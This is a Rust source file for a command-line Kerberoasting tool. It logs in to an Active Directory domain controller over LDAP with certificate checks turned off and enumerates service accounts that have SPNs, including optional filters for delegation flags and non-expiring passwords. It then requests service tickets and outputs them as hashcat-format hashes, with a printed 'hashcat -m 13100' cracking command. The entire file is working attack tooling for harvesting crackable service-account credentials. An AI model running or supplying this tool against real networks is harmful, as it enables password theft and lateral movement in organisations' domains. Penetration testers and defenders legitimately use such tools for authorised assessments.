mod error;
mod kerberos;

use clap::Parser;
use ldap3::{drive, LdapConnAsync, LdapConnSettings, Scope, SearchEntry};
use std::collections::HashMap;

use kerberos::client::KerberoastClient;

/// GetUsersSPN in Rust — full Kerberoasting (LDAP enum + TGS-REQ → hashcat)
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Domain controller IP or hostname
    #[arg(short = 'H', long, value_name = "HOST")]
    dc_host: String,

    /// Domain (e.g. corp.local)
    #[arg(short, long)]
    domain: String,

    /// Username (bare, CORP\\user, or user@corp.local)
    #[arg(short, long)]
    username: String,

    /// Password
    #[arg(short, long)]
    password: String,

    /// Use LDAPS (port 636). Kerberos always uses port 88.
    #[arg(long, default_value_t = false)]
    ldaps: bool,

    /// Custom LDAP port (default: 389 / 636 for LDAPS)
    #[arg(long)]
    ldap_port: Option<u16>,

    /// KDC (Kerberos) port [default: 88]
    #[arg(long, default_value_t = 88)]
    kdc_port: u16,

    /// Only enumerate SPNs via LDAP — skip TGS-REQ
    #[arg(long, default_value_t = false)]
    enumerate_only: bool,

    /// Output format: hashcat | table | json
    #[arg(short, long, default_value = "hashcat")]
    output: String,

    /// Filter: only accounts whose password never expires
    #[arg(long, default_value_t = false)]
    pwd_never_expires: bool,

    /// Limit to a specific sAMAccountName
    #[arg(long)]
    target_user: Option<String>,

    /// Write hashes to this file (one per line)
    #[arg(short, long)]
    write: Option<String>,
}

// ── LDAP helpers ──────────────────────────────────────────────────────────────

fn build_base_dn(domain: &str) -> String {
    domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
}

fn filetime_to_string(value: &str) -> String {
    let ft: i64 = value.parse().unwrap_or(0);
    if ft == 0 || ft == i64::MAX || ft < 0 { return "<never>".to_string(); }
    let unix_ts = (ft / 10_000_000) - 11_644_473_600;
    if unix_ts <= 0 { return "<never>".to_string(); }
    chrono::DateTime::from_timestamp(unix_ts, 0)
        .map(|dt| dt.format("%Y-%m-%d %H:%M:%S UTC").to_string())
        .unwrap_or_else(|| "<never>".to_string())
}

fn uac_delegation(uac: u32) -> String {
    let mut f = vec![];
    if uac & 0x80000 != 0   { f.push("TRUSTED_FOR_DELEGATION"); }
    if uac & 0x1000000 != 0 { f.push("TRUSTED_TO_AUTH_FOR_DELEGATION"); }
    if f.is_empty() { "None".into() } else { f.join(", ") }
}

#[derive(Debug)]
struct SpnEntry {
    samaccount:   String,
    spns:         Vec<String>,
    member_of:    Vec<String>,
    pwd_last_set: String,
    last_logon:   String,
    delegation:   String,
}

// ── Output ────────────────────────────────────────────────────────────────────

fn print_table(entries: &[SpnEntry]) {
    println!(
        "\n{:<30} {:<50} {:<22} {:<22} {:<30}",
        "ServicePrincipalName", "Name", "PwdLastSet", "LastLogon", "Delegation"
    );
    println!("{}", "─".repeat(155));
    for e in entries {
        for (i, spn) in e.spns.iter().enumerate() {
            if i == 0 {
                println!("{:<30} {:<50} {:<22} {:<22} {:<30}", spn, e.samaccount, e.pwd_last_set, e.last_logon, e.delegation);
            } else {
                println!("{:<30}", spn);
            }
        }
    }
    eprintln!("\n[*] {} Kerberoastable account(s).", entries.len());
}

fn print_json_entries(entries: &[SpnEntry]) {
    println!("[");
    for (i, e) in entries.iter().enumerate() {
        let spns = e.spns.iter().map(|s| format!("\"{}\"", s)).collect::<Vec<_>>().join(",");
        let mof  = e.member_of.iter().map(|s| format!("\"{}\"", s)).collect::<Vec<_>>().join(",");
        let c    = if i < entries.len()-1 { "," } else { "" };
        println!("  {{\"sAMAccountName\":\"{}\",\"SPNs\":[{}],\"PwdLastSet\":\"{}\",\"LastLogon\":\"{}\",\"Delegation\":\"{}\",\"MemberOf\":[{}]}}{}",
            e.samaccount, spns, e.pwd_last_set, e.last_logon, e.delegation, mof, c);
    }
    println!("]");
}

// ── Main ──────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();
    let realm = args.domain.to_uppercase();

    let bare_user = if args.username.contains('\\') {
        args.username.splitn(2, '\\').nth(1).unwrap_or(&args.username).to_string()
    } else if args.username.contains('@') {
        args.username.splitn(2, '@').next().unwrap_or(&args.username).to_string()
    } else {
        args.username.clone()
    };

    let bind_dn = format!("{}@{}", bare_user, args.domain);

    // ── LDAP ─────────────────────────────────────────────────────────────────
    let ldap_port = args.ldap_port.unwrap_or(if args.ldaps { 636 } else { 389 });
    let ldap_url  = format!("{}://{}:{}", if args.ldaps { "ldaps" } else { "ldap" }, args.dc_host, ldap_port);
    eprintln!("[*] LDAP → {}", ldap_url);

    let settings = LdapConnSettings::new().set_no_tls_verify(true);
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &ldap_url).await?;
    drive!(conn);
    ldap.simple_bind(&bind_dn, &args.password).await?.success()?;
    eprintln!("[+] Authenticated as: {}", bind_dn);

    let base_dn  = build_base_dn(&args.domain);
    let user_flt = args.target_user.as_ref().map(|u| format!("(sAMAccountName={})", u)).unwrap_or_default();
    let pwd_flt  = if args.pwd_never_expires { "(userAccountControl:1.2.840.113556.1.4.803:=65536)" } else { "" };
    let filter   = format!(
        "(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)){}{})",
        pwd_flt, user_flt
    );

    let attrs = ["sAMAccountName","servicePrincipalName","memberOf","pwdLastSet","lastLogon","userAccountControl"];
    let (rs, _) = ldap.search(&base_dn, Scope::Subtree, &filter, attrs.to_vec()).await?.success()?;
    ldap.unbind().await?;

    let mut entries: Vec<SpnEntry> = Vec::new();
    for entry in rs {
        let se = SearchEntry::construct(entry);
        let a: HashMap<String, Vec<String>> = se.attrs;
        let samaccount   = a.get("sAMAccountName").and_then(|v| v.first()).cloned().unwrap_or_default();
        let spns         = a.get("servicePrincipalName").cloned().unwrap_or_default();
        let member_of    = a.get("memberOf").cloned().unwrap_or_default()
            .into_iter().map(|dn| dn.split(',').next().unwrap_or("").trim_start_matches("CN=").to_string()).collect();
        let pwd_last_set = a.get("pwdLastSet").and_then(|v| v.first()).map(|s| filetime_to_string(s)).unwrap_or_else(|| "<never>".into());
        let last_logon   = a.get("lastLogon").and_then(|v| v.first()).map(|s| filetime_to_string(s)).unwrap_or_else(|| "<never>".into());
        let uac: u32     = a.get("userAccountControl").and_then(|v| v.first()).and_then(|s| s.parse().ok()).unwrap_or(0);
        entries.push(SpnEntry { samaccount, spns, member_of, pwd_last_set, last_logon, delegation: uac_delegation(uac) });
    }

    if entries.is_empty() { eprintln!("[-] No Kerberoastable accounts found."); return Ok(()); }

    let total_spns: usize = entries.iter().map(|e| e.spns.len()).sum();
    eprintln!("[*] Found {} account(s), {} SPN(s).", entries.len(), total_spns);

    if args.enumerate_only {
        match args.output.as_str() {
            "json" => print_json_entries(&entries),
            _      => print_table(&entries),
        }
        return Ok(());
    }

    // ── Kerberos ──────────────────────────────────────────────────────────────
    eprintln!("[*] KDC → {}:{}", args.dc_host, args.kdc_port);
    eprintln!("[*] Requesting TGT for {}@{} ...", bare_user, realm);

    let krb = KerberoastClient::new(&args.dc_host, args.kdc_port, &realm, &bare_user, &args.password);
    let all_spns: Vec<String> = entries.iter().flat_map(|e| e.spns.iter().cloned()).collect();
    let results = krb.kerberoast(&all_spns).await?;

    let spn_to_user: HashMap<String, String> = entries.iter()
        .flat_map(|e| e.spns.iter().map(|s| (s.clone(), e.samaccount.clone())))
        .collect();

    let mut hashes = Vec::new();
    for (spn, result) in all_spns.iter().zip(results.iter()) {
        match result {
            Ok(tgs)  => {
                eprintln!("[+] {} ({})", spn, spn_to_user.get(spn).map(|s| s.as_str()).unwrap_or("?"));
                hashes.push(tgs.hashcat.clone());
            }
            Err(e) => eprintln!("[-] {} → {}", spn, e),
        }
    }

    println!();
    match args.output.as_str() {
        "table" => { print_table(&entries); for h in &hashes { println!("{}", h); } }
        "json"  => {
            println!("[");
            for (i,h) in hashes.iter().enumerate() {
                println!("  \"{}\"{}",  h, if i<hashes.len()-1{","}else{""});
            }
            println!("]");
        }
        _ => { for h in &hashes { println!("{}", h); } }
    }

    if let Some(ref path) = args.write {
        std::fs::write(path, hashes.join("\n") + "\n")?;
        eprintln!("[+] Hashes written to: {}", path);
    }

    if !hashes.is_empty() {
        eprintln!("\n[*] Crack: hashcat -m 13100 {} /path/wordlist.txt",
            args.write.as_deref().unwrap_or("<hashes.txt>"));
    }

    Ok(())
}
